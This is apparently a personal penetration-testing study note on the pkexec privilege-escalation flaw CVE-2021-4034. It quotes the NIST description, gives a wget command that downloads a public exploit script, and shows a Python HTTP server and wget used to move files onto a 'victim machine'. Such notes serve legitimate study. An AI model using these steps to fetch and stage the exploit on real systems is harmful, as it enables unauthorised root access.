> [!cite] NIST-CVE-2021-4034
> A local privilege escalation vulnerability was found on polkit's **pkexec** utility. The pkexec application is a **setuid** tool designed to allow unprivileged users to **run commands as privileged users** according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

We have `pkexec`with SUID the bit enabled.
The exploit https://github.com/Almorabea/pkexec-exploit
```shell
wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```
Or the code [[CVE-2021-4034-exploit\|CVE-2021-4034-exploit]]

And transfer to the victim machine

## Transfer files
Using **Python**, in the folder that contain the file to send **on the source machine.** E.g. `file.txt` #flashcard
```python
python -m http.server 4545
```
<!--ID: 1728611164654-->

On the destination machine
```shell
wget http://IP_SOURCE_MACHINE:4545/file.txt
```
